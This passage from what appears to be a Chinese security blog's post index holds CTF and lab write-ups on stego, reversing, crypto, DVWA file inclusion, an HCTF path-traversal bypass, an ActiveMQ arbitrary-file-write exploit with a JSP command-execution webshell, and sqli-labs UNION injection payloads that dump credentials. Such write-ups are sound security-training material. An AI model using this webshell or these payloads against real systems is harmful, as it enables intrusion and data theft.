监听端口反弹shell\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190707191042260.png)\n# windows执行文件\n直接执行的话可能比较明显，所以参照文章我们写了一个1.html文件\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/windows%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6.png)\n执行1.html文件，选择运行->允许阻止内容->选择是，就反弹成功了\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E6%89%A7%E8%A1%8C.png)\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E5%85%81%E8%AE%B8%E8%84%9A%E6%9C%AC.png)\n\n# 获取shell\n\n\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E7%9B%91%E5%90%AC%E6%8E%A5%E5%8F%A3%E5%8F%8D%E5%BC%B9shell2.png)\n---\n复现完成，过程简单，值得一学\n","tags":["反弹shell"],"categories":["WEB安全"]},{"title":"删除github的某个文件","url":"/2019/10/04/实用技巧/删除github的某个文件/","content":"\n搭建图床的时候，位置弄错不会删除，这里总结一下\n\n<!-- more -->\n\n#  前言\n\n> 今天用github做图床，上传的文件没有改名字并且都在同一个文件中散乱，然后想要删除的时候发现没有删除的选项。\n>\n> 然后百度了下相关的内容，并把操作记录以备查看，并给和我一样不会的小伙伴们一个参考\n\n## 开始前的准备\n\n首先看看我现在的情况\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E6%9B%B4%E6%94%B9%E5%89%8D%E7%9A%84%E6%83%85%E5%86%B5.png)\n\n\n\n之后我们需要有git这个软件支持，我这里用的是`Git-2.21.0-64-bit.exe`这个版本\n\n附上下载地址：[git官方下载地址](https://git-scm.com/download/)\n\ngit的安装比较简单，如果需要过程请参考网上的教程，这里就不多说了\n\n下载好之后，鼠标右键就可以打开`git bash here`\n\n## 删除不需要的文件\n\n1 如果是刚下载git的请跟着下面的步骤走，\n\n首先先配置自己的git信息，\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E5%88%9A%E4%B8%8B%E8%BD%BDgit%E7%9A%84%E5%88%9D%E5%A7%8B%E6%AD%A5%E9%AA%A4.png)\n\n之后初始化，在设置自己的\n\n2 首先需要把github的项目拉倒本地，如果刚下载git请移步第一步\n\n```xml\n\n1 添加origin  \n如果有.git 就不需要 git init  \n$ git init  \n$ git remote add origin git@github.com:ST0new/picture.git  \n2 拉取github文件  \n$ git pull origin master   \n3 查看文件  \n$ dir  \n4 删除不需要的文件  \n$ git rm -r --cached 0n7nye49.bmp  \n5 添加说明  \n$ git commit -m '删除了 0n7nye49.bmp '  \n6 更新github仓库  \n$ git add .  \n$ git push -u origin master  \n```\n\n拉取github上的文件\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/github%E6%8B%89%E5%8F%96%E6%96%87%E4%BB%B6.png)\n\n\n\n输入dir查看目录\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E6%8B%89%E5%8F%96%E4%B8%8B%E6%9D%A5%E6%9F%A5%E7%9C%8B.png)\n\n\n\n选择不需要的文件删除\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/dir%E6%9F%A5%E7%9C%8B%E7%9B%AE%E5%BD%95.png)\n\n\n\n提交添加声明\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E6%8F%90%E4%BA%A4%E6%B7%BB%E5%8A%A0%E5%A3%B0%E6%98%8E.png)\n\n\n\n更新远程仓库\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E6%9B%B4%E6%96%B0%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93.png)\n\n\n\n查看\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E6%9F%A5%E7%9C%8B%E6%9B%B4%E6%96%B0%E5%90%8E%E7%9A%84%E5%86%85%E5%AE%B9.png)\n\n### 报错1 没有初始化\n\n```xml\n$ git pull origin master\nfatal: not a git repository (or any of the parent directories): .git\n```\n\n解决：\n\n```xml\ngit init\n```\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E6%B2%A1%E6%9C%89%E5%88%9D%E5%A7%8B%E5%8C%96.png)\n\n\n\n### 报错2 添加远程库失败\n\n```xml\n$ git remote add origin git@github:ST0new/picture\nfatal: remote origin already exists.\n\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190710083208278.png)\n\n解决：删除重新添加\n\n```xml\n$ git remote rm origin\n$ git remote add origin git@github.com:ST0new/picture.git\n\n```\n---\n\n希望能解决你的问题\n","tags":["文件删除"],"categories":["实用技巧"]},{"title":"错误提示【URL file-access is disabled in the server configuration in】解决","url":"/2019/10/04/web安全/远程文件包含/远程文件包含错误解决方法/","content":"\nDVWA 初体验 远程文件包含错误，需要开启**allow_url_include**或者**allow_url_ fopen**\n\n<!-- more -->\n\n# 前言\n\n今天在做dvwa的file inclusion，发现远程 文件包含出错\n\n## 解决方法\n可以看到提示的服务器配置中禁用url文件访问。\n`Warning: include() [function.include]: URL file-access is disabled in the server configuration in /var/www/dvwa/vulnerabilities/fi/index.php on line 35`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190520194643142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)\n\n1. 在linux中搜索php.ini文件  \n\n\t命令：`find / -name php.ini`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190520195041822.png)我们去修改`/etc/php5/cgi/php,ini`\n\n2. vim 打开文件 `vim /etc/php5/cgi/php.ini`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190520195551210.png)\n3. 搜索关键字`allow_url_include或者allow_url_ fopen`设置两个都为`On`  \n\t可以发现`allow_url_include为off` 我们修改它为`On`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190520195846677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)\n4. 重新尝试远程访问，访问成功。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2019052020005065.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)\n---\n## 自己遇到的坑\n>当我发现问题的时候，我没有意识的修改的是php的php.ini，而是去查看了我的dvwa的php.ini 发现没有错误，自己研究了半天，才发现想错了，可以查看自己的dvwa下大的php发现是对的。\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190520200259826.png)\n","tags":["远程文件包含"],"categories":["WEB安全"]},{"title":"实验吧-隐写-欢迎来到地狱","url":"/2019/10/04/CTF/实验吧/实验吧-隐写-欢迎来到地狱/","content":"\n多重隐写+加密，需要清醒的认识，才能不坠入地狱\n\n<!-- more -->\n\n# 实验吧\n\n## 隐写题\n\n### 欢迎来到地狱\n\n1.  解压\n\n    访问url，获取一个zip文件，解压发现存在3个文件 分别是jpg，doc，zip\n\n    根据文件名去，首先我们去打开第一个文件地狱伊始.jpg 打开提示文件错误。\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175715.png)\n\n    使用winhex打开查看，发现是jfif的文件，之后看到文件头标识不对，查询发现jfif的文件头是`FFD8FFFE00, .JPEG;.JPE;.JPG, \"JPGGraphic File\"` 我们添加文件头，方法：右键->edit->Paste zero bytes -> 4 添加四个比特\n    \n    之后添加为\n    \n    ![图片.png](https://upload-images.jianshu.io/upload_images/18851353-865de8c22816711b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n    打开图片\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175722.png)\n\n\n    图片链接失效，这里需要去隔壁wp里面找一个\n    \n    [https://pan.baidu.com/s/1i49Jhlj](https://pan.baidu.com/s/1i49Jhlj)\n    \n    注意这里的字母，打开是个音频\n\n2.  音频隐写\n\n    使用audacity.exe 打开文件，然后猜测可能是莫尔斯码\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175731.png)\n\n    101 0 1011 0100 0 1 001 000 110 111 通过对莫尔斯码对比得到密码\n\n    key letusgo\n\n3.  图片隐写\n\n    使用一个web网址上传图片直接出结果，这个参考评论，我使用stegsolve 没有查看到\n\n    [http://www.atool9.com/steganography.php](http://www.atool9.com/steganography.php)\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175740.png)\n\n\n    这里试了n久 没弄出来 ，之后查看了下wp 发现解密的信息错误,以下的为正确的 key{you are in finally hell now}\n    \n    这里和dalao商量了下，可能是图片的问题。\n    \n    终点\n    \n    有一个txt和一个图片，先看txt文档，0和1组成的可能是二进制，试试解字符串\n    \n    [![图片.png](https://upload-images.jianshu.io/upload_images/18851353-80915ee08664e99a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n    ruokouling = 弱口令\n    \n    然后查看图片 地狱大门.jpg 使用winhex 打开，在最后看到有小姐姐.txt 文件 使用kali的foremost 分离\n\n ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175748.png)\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175756.png)\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175802.png)\n\n\n\n    测试发现弱口令为Password\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175809.png)\n\n    VTJGc2RHVmtYMTlwRG9yWjJoVFArNXcwelNBOWJYaFZlekp5MnVtRlRTcDZQZE42elBLQ01BPT0=\n    \n    可能是base系列\n    \n    base64 解密一次 U2FsdGVkX19pDorZ2hTP+5w0zSA9bXhVezJy2umFTSp6PdN6zPKCMA==\n    \n    rabbit 解密 一次 fxbqrwrvnwmngrjxsrnsrnhx\n    \n    凯撒 解密一次 woshinimendexiaojiejieyo\n    \n    附上凯撒解密的脚本\n```\n    # -*- coding: utf-8 -*-\n    ​\n    import os\n    ​\n    str = \"fxbqrwrvnwmngrjxsrnsrnhx\"\n    for i in range(0,26):\n     for j in str:\n     if ord(j) -i >= 97:\n     print(chr(ord(j)-i),end=\"\")\n     else:\n     print(chr(ord(j)-i+26),end=\"\")\n     print()</pre>\n```\n4.  flag\n\n    CTF{woshinimendexiaojiejieyo}\n","tags":["misc"],"categories":["CTF"]},{"title":"实验吧-逆向工程-debug","url":"/2019/10/04/CTF/实验吧/实验吧-逆向工程-debug/","content":"\n了解函数运行，合适添加断点判断，获取一闪而过的flag\n\n<!-- more -->\n\n# 实验吧\n\n## 逆向工程\n\n### debug\n\n1. 下载文件，然后用idaq打开，\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175528.png)\n\n\n    尝试在linux下打开发现么没有返回值，\n    \n    在idaq里面去查看shift+F12 查看字符串，发现有个printing flag\n    \n    这里想着如何可以进去，\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175536.png)\n\n\n    可以看到其实位置在0x804849b\n\n2.  设置断点，查看\n\n    一般设置在main 但是main没有定义\n\n    [图片上传失败...(image-12bd86-1566818035404)] \n\n    这里查了下发现这几个可以代替\n\n    程序启动的过程应该是这样的：\n\n    _start -> __libc_start_main -> main. 具体一点就是：\n\n    _start -> **libc_start_main ->** libc_csu_init -> main. 再具体一点就是：\n\n    _start -> **libc_start_main ->** libc_csu_init -> _init -> main -> _fini.\n\n    官方点的解释：__libc_start_main sets up the environment and then calls the `main()` function when the binary is run.\n\n    所以我们设置在libc_start_main 也可以达到相同的效果\n\n3.  获取flag\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175456.png)\n\n\n    设置入口\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175505.png)\n\n\n\n    运行，之后在设置断点 ， 先 r 在 set $eip=0x804849b\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175518.png)  ![图片.png](https://upload-images.jianshu.io/upload_images/18851353-7f80c2c362487886.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n    成功拿到flag\n","tags":["reverse"],"categories":["CTF"]},{"title":"传统知识+古典密码","url":"/2019/10/04/CTF/实验吧/实验吧-密码学-传统密码+古典密码/","content":"\n多种加密结合，一步一步解密，追寻真理\n\n<!-- more -->\n\n# 实验吧\n\n## 密码学\n\n### 传统知识+古典密码\n\n1.  题目\n\n    辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳\n\n    信的背面还写有“+甲子”，请解出这段密文\n\n    key：CTF{}\n\n2.  查一下得到了一份六十甲子顺序表\n\n ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175426.png)\n\n\n\n    获取到它的值：28 30 23 8 17 10 16 30\n    \n    题目后面说`+甲子` ：88 90 83 68 77 70 76 90\n    \n    对应ascii： XZSDMFLZ\n\n3.  根据古典密码解密\n\n    首先尝试栅栏密码： XMZFSLDZ\n\n    在尝试凯撒密码：SHUANGYU\n\n4.  得到flag\n\n    CTF{SHUANGYU}\n\n5.  附上python脚本\n    ```\n     str = \"XMZFSLDZ\" \n     for i in range(0,26):                        \n         for j in str:\n             if ord(j) -i >= 65:\n                 print(chr(ord(j)-i),end=\"\")\n             else:\n                 print(chr(ord(j)-i+26),end=\"\") \n         print()\n    ```\n","tags":["crypto"],"categories":["CTF"]},{"title":"变异凯撒","url":"/2019/10/04/CTF/实验吧/实验吧-密码学-变异凯撒/","content":"\n仔细观察凯撒加密，找寻其中的规律\n\n<!-- more -->\n\n# 实验吧\n\n## 密码学\n\n### 变异凯撒\n\n> 凯撒密码\n> \n> 在[密码学](https://baike.baidu.com/item/%E5%AF%86%E7%A0%81%E5%AD%A6)中，**恺撒密码**（英语：Caesar cipher），或称**恺撒加密**、**恺撒变换**、**变换加密**，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，[明文](https://baike.baidu.com/item/%E6%98%8E%E6%96%87)中的所有字母都在[字母表](https://baike.baidu.com/item/%E5%AD%97%E6%AF%8D%E8%A1%A8)上向后（或向前）按照一个固定数目进行偏移后被替换成[密文](https://baike.baidu.com/item/%E5%AF%86%E6%96%87)。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。这个加密方法是以罗马共和时期[恺撒](https://baike.baidu.com/item/%E6%81%BA%E6%92%92)的名字命名的，当年恺撒曾用此方法与其将军们进行联系。\n\n1.  看一下加密的密文\n\n    加密密文：afZ_r9VYfScOeO_UL^RWUc  格式：flag{ }\n\n2.  将加密的密文转成二进制\n\n    97 102 90 95 114 57 86 89 102 83 99 79 101 79 95 85 76 94 82 87 85 99\n\n3.  根据flag的格式 比较发现\n\n    f = 102，l = 108, a = 97 , g = 103\n\n    可以发现 第一位 偏移5，第二位偏移6 ， 第三位偏移7 ，第四位偏移8\n\n4.  写个python脚本跑一下\n\n    ```\n    k = 5 \n    str = 'afZ_r9VYfScOeO_UL^RWUc' \n    for i in str:                    \n     print(chr(ord(i)+k),end=\"\")\n     k +=1 \n    ```\n    结果：flag{Caesar_variation}\n","tags":["crypto"],"categories":["CTF"]},{"title":"MD5之守株待兔","url":"/2019/10/04/CTF/实验吧/实验吧-安全杂项-MD5守株待兔/","content":"\n实验吧-安全杂项-MD5之守株待兔 ，通过md5加密时间戳获取flag\n\n<!-- more -->\n\n# 实验吧\n\n## 安全杂项\n\n### MD5之守株待兔，你需要找到和系统锁匹配的钥匙\n\n做题感受，这个题难道就只能一直刷新等吗，太不亲民了\n\n1.  访问url\n\n    [http://ctf5.shiyanbar.com/misc/keys/keys.php(http://ctf5.shiyanbar.com/misc/keys/keys.php)\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175344.png)\n\n\n    查看自己的密钥，发现是空的，经过尝试后发现，需要通过get一个数，这个数代表时间，然后md5解密系统的密钥，发现是个时间戳，而且每次都会变就更加确认了。\n    \n    之后通过自己get的时间，一直刷新，基本大30 就可以获取到了。\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175352.png)\n\n\n拿到flag，直接照格式提交就行，不要和我傻得还去md5一下，然后提交几次都没有成功\n","tags":["misc"],"categories":["CTF"]},{"title":"ActiveMQ任意文件写入漏洞分析溯源","url":"/2019/10/04/CTF/墨者学院/墨者学院-web安全-ActiveMQ任意文件写入漏洞/","content":"\n\n\n# 墨者学院\n\n## WEB安全\n\n### ActiveMQ任意文件写入漏洞分析溯源\n\n#### ActiveMQ 简介\n\nActiveMQ 是 Apache 软件基金会下的一个开源消息驱动中间件软件。Jetty 是一个开源的 servlet 容器，它为基于 Java  的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0 及以后版本默认集成了jetty。在启动后提供一个监控 ActiveMQ 的 Web 应用\n\nfileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：\n\n1.  其使用率并不高\n\n2.  文件操作容易出现漏洞\n\n#### 漏洞复现\n\n1.  访问url\n\n    ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005174915.png)\n\n\n2.  查找漏洞\n\n    搜索发现存在CVE-2016-3088 漏洞，找到分析查看漏洞原因\n\n    查询发现在ActiveMQ<5.12.x版本存在fileserver 应用，可以通过fileserver写入文件（不解析jsp文件）通过移动到任意位置，就可以造成任意文件写入漏洞。\n\n    > 文件写入的几种利用方式\n    > \n    > 1 写入webshell\n    > \n    > 2 写入 cron 或 ssh key\n    > \n    > 3 写入 jar 或 jetty.xml 等库和配置文件\n    > \n    > 写入webshell的好处是，门槛低更方便，但前面也说了fileserver不解析jsp，admin和api两个应用都需要登录才能访问，所以有点鸡肋；写入cron或ssh  key，好处是直接反弹拿shell，也比较方便，缺点是需要root权限；写入jar，稍微麻烦点（需要jar的后门），写入xml配置文件，这个方法比较靠谱，但有个鸡肋点是：我们需要知道activemq的绝对路径。\n\n3.  漏洞利用\n\n    尝试写入jsp\n\n    有回显带密码验证的\n     ```\n     <% \n     if(\"023\".equals(request.getParameter(\"pwd\"))){\n     java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream();\n     int a = -1;\n     byte[] b = new byte[2048];\n     out.print(\"<pre>\");\n     while((a=in.read(b))!=-1){\n     out.println(new String(b));\n     }\n     out.print(\"</pre>\");\n     }\n    %>\n    请求url：http://ip:port/Shell/cmd2.jsp?pwd=023&i=ls</pre>\n     ```\n    通过burp访问，发现需要验证，需要登录，我们尝试登录，默认的ActiveMQ的账号和密码均为admin\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005174936.png)\n\n\n    登录后查看http方法 ，发现没有put方法\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005174945.png)\n\n\n\n    执行put方法 发现却上传成功了\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005174951.png)\n\n\n    接下来通过move移动到admin或api下，就可以解析jsp文件了， 查找他的绝对路径\n    \n    > 访问url：[http://ip:port/admin/test/systemProperties.jsp](http://ip:port/admin/test/systemProperties.jsp)\n    > \n    > [图片上传失败...(image-99ffb1-1567592524169)]\n    \n    通过move方法将jsp木马移动到admin或api下，进行解析\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175000.png)\n\n    然后访问，可以执行命令，\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175021.png)\n\n\n    这里就可以直接查看flag，最后在根目录找到了flag\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175035.png)\n\n\n#### 参考链接\n\n[jsp一句话](https://www.cnblogs.com/swyft/articles/5563732.html)\n\n[ActiveMQ任意文件写入漏洞](https://www.jianshu.com/p/564fb8b54a67)\n","tags":["任意文件写入"],"categories":["CTF"]},{"title":"HCTF2018-warmup-writeup","url":"/2019/10/04/CTF/Buuoj/HCTF2018-warmup-writeup/","content":"\n\n\n# BUUCTF\n## web\n### warmup\n这里我直接上代码讲 菜鸡不会php，全是现查 哪里不对，欢迎大佬指点\n```php\n <?php\n    highlight_file(__FILE__);\n    class emmm\n    {\n        public static function checkFile(&$page) \n        /* \n        传入了变量page，也就是我们刚刚传进来的file\n        */\n        {\n        \t// 这里定义了白名单\n            $whitelist = [\"source\"=>\"source.php\",\"hint\"=>\"hint.php\"];\n            if (! isset($page) || !is_string($page)) {\n            /*2\n            为了返回 true 两个条件必须满足\n            \t1 page存在 \n            \t2 page是字符串 ，\n            \t这里和外层的判断file 一致基本是再次判断了一遍\n            */\n                echo \"you can't see it\";\n                return false;\n            }\n\t\t\t/*3\n\t\t\tin_array(search,array,type) 函数搜索数组中是否存在指定的值，\n\t\t\t白名单过滤，需要返回了ture\n\t\t\t所以这里我们传入的page或者是经过截断之后的page必须是soure.php或hint.php，\n\t\t\t这里是正常的访问，我们需要构造文件任意包含，所以这里传入的不满足条件，这里不是注意的点，往下继续看\n\t\t\t*/\n            if (in_array($page, $whitelist)) {\n                return true;\n            }\n\t\t\t/*\n\t\t\t这里mb_sustr 是个截断，返回0到mb_strpos之间的内容，而mb_strps 则是查找第一次出现的位置，\n\t\t\t所以基本可以理解为获取page 两个？之间的字符串，\n\t\t\t也就是获取file两个？之间的字符串，\n\t\t\t放到url中就是http://ip/?file=ddd?中的file=ddd\n\t\t\t\n            */\n            $_page = mb_substr( \n                $page,\n                0,\n                mb_strpos($page . '?',  '?')\n            );\n            if (in_array($_page, $whitelist)) { \n            //' 6 这里和上面类似 查看_page 是否在白名单中\n                return true;\n            }\n\n            $_page = urldecode($page); // 这里发现对_page进行了一次decode解码，\n            $_page = mb_substr(//获取两个？？之间的内容\n                $_page,\n                0,\n                mb_strpos($_page . '?', '?')\n            );\n            // 这里是我们要绕过的点，从这里往上看 尝试构造\n            if (in_array($_page, $whitelist)) {//白名单\n                return true;\n            }\n            echo \"you can't see it\";\n            return false;\n        }\n    }\n\t/*1\n\t必须满足if条件，才能包含file，这里也可以猜到可能考的是文件包含： \n\t\t1 REQUEST['file']不为空 \n\t\t2 REQUEST['file']是字符串 \n\t\t3 checkFile($_REQUEST['file']) 为ture，回到checkFile 函数分析如何返回true\n\t*/\n    if (! empty($_REQUEST['file'])\n        && is_string($_REQUEST['file'])\n        && emmm::checkFile($_REQUEST['file'])\n    ) {\n        include $_REQUEST['file'];\n        exit;\n    } else {\n        echo \"<br><img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" />\";\n    }  \n?>\n\n所以我们的payload 就是\nfile=source.php%253f../....//../../../ffffllllaaaagggg\nflag{bd04766d-3dfa-47bc-9b15-703a4b8cbd07} \n```\n\n经过上面的分析，大致可以看到对file的内容没有过滤，只判断了存在和字符串，所以可以使用文件包含读取flag，而关键点在_page 经过截断后返回true\n\n在检查字符串的时候使用了白名单尝试绕过 但_page只截取了？？之间的内容，所以我们可以构造 ？source.php？../../../phpinfo.php 这样来绕过过滤。\n\n接下来就是如何绕过了.\n我们的参数应该是?source.php../../../flag.txt\n而_page进行截断后判断白名单。\n我们的参数就?source.php?../../../flag.txt\n对_page判断了两个 第二次是我们的绕过点，代码对page进行了一次解码，第一次判断为false，第二次为ture\n我们的参数就变成了?source.php%253f../../../flag.txt\n>这里解释一下为什么经过了两次url编码，第一次是url传入到服务器时解码了一次，第二次是page传给_page解码了一次\n\n所以根据hint.php的提示，最终payload\nfile=source.php%253f/../../../../../ffffllllaaaagggg\n\n\n\n","tags":["web","文件包含"],"categories":["CTF"]},{"title":"sql-lab 复现通关（深入学习）","url":"/2019/10/04/web安全/sql注入/sql-lab-通关宝典/","content":"\nDocker 搭建环境 sql-labs 通关\n\n<!-- more -->\n\n\n\n# sql-lab 复现通关（深入学习）\n\n## 前言\n\nsqllab 从基础到复杂， 对于初学者练习非常有用。\n\n## 目的\n\n学习如何进攻才能懂得如何防守\n\n## less-1 基于错误的单引号字符串\n\n```sql\n- 正常访问\nhttp://192.168.248.134:8080/Less-1/?id=1\n\n- 添加 ' \n\t返回报错信息：You have an error in your SQL syntax; check the manual that corresponds to your     MySQL  server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1\n\n- 使用 1' order by 3 %23\n\t得到列数为3\n\n- 使用union 获取admin和password\n\t-1 的作用是查询不存在的值，使得结果为空\n\t-1 ' union select 1,2,3 // 确定可以显示到页面的位置\n\t-1 ' union select 1,2,group_concat(schema_name) from information_schema.schemata // 得到数据库名 或 通过database() 获取数据库名\n\t-1 ' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = 'security' %23\n\t-1 ' union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'users'%23\n\t-1 ' union select 1,username,password from users %23\n\t\n```\n\n> 思考一下，为什么加上引号后会报错\n\n查看源码 直接将web页面传递的值加入sql语句中，没有进行过滤导致的错误\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-5fdec2ae2a7dba5e?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n再来看看web页面返回的错误\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-f93cc0e7d38d1726?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n接下来分析 为何加了' 导致报错\n\n我们分析一下他的源码,在数据库中执行一下\n\n`$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";`\n\n这里加不加单引号都可以，id是int型的，可以不加 ，也可以加，而username和password字段都是char类型，就必须加引号。\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-997982c3f27d56a8?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n然后，我们尝试添加一些特殊的字符，干扰正常的数据输入，达到执行其他语句的目的，这就是sql注入，所有的sql注入都是这个道理，如果没有和数据库进行交互，那么也就构不成注入的条件，比如后面的二次注入，虽然第一次没有报错和注入条件，但是在后期会利用时，由于过滤不当导致注入。\n\n我们看一下这一句，当我们输入1’# 的时候，回车还需要一个冒号作为闭合，为什么呢，因为系统在读取到#的同时将不会继续往下读，而是当做注释忽略了，这就达成了绕过的目的。\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-dc2e919adafc67d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n而这时，如果我们在1’ 之后添加一些其他的内容，获取可以获取想要的答案，可以看到通过union 联合查询，我们可以获取到两个数据，\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-a51299cba59152d9?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n但是 web页面只会返回第一条数据，如何返回第二条呢，这里就需要让第一条数据未查询到，经过修改，成功让我们需要的数据返回页面，这时 就可以通过联合查询获取想要的数据\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-52988f53eb51e9fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n这里也可以使用burp去fuzz一下，获取报错类型，判断绕过方式，burp也自带了fuzz，可以在渗透或者ctf中做判断，猜测过滤的内容对如何去绕过有非常大的帮助\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-2dfd8d773fef0a45?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-658f3930b56cd403?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n查看burp返回的内容，933代表正常的内容返回，而1042返回的是报错内容，基于这个前提，我们就想办法去绕过\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-348f92df82d3f069?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n\n基本简单的注入就是这个样子 快开始真正的实践吧\n\n基本判断注入通过加‘ 是否报错,先记住这里的报错，等下的双引号报错和这里可以形成类比，可以判断1周围都是单引号。那么我们就要通过某些方式去闭合他，\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-f7d404ee7f0411a5?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n```\n You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1 \n```\n\n这里介绍两种方式，一种是注释，另一种是通过引号闭合 如果有时候waf过滤了注释符 可以通过另一种方式绕过\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-bfecccd17080f24a?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-63a496c934282000?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n接下来就是获取用户名和密码了\n\n一般sql注入的步骤 ： 字段数->数据库->表->列->值\n\n字段数可以通过 order by 去猜解 或者 通过 union select 1,2,3, 4 这样是试。如果报错那么就不是\n\n首先获取字段数，通过order by 3  返回正确的值，而order by 4 返回错误\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-f85f9875d2e54e69?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n接来下 通过联合查询 获取数据库和表以及最后的password\n\n这里就不多演示了，可以根据我给的数据去尝试\n\n## Less-2 基于错误的get整型注入\n\n前面的题基本都会写出每一个步骤，到后面就专精于如何绕过\n\n顺便普及一波知识\n\nmysql的注释符一般有三种\n\n`--  `, 单行注释\n\n`#` 单行注释\n\n`/**/` 多行注释 \n\n注意-- 不是注释符，--后还需要一个空格 ，而在web中 + 和空格等价，这就是为何我们注释符喜欢使用--+的原因了\n\n```sql\n- 正常访问 \n\thttp://192.168.248.144:8080/Less-2/?id=1 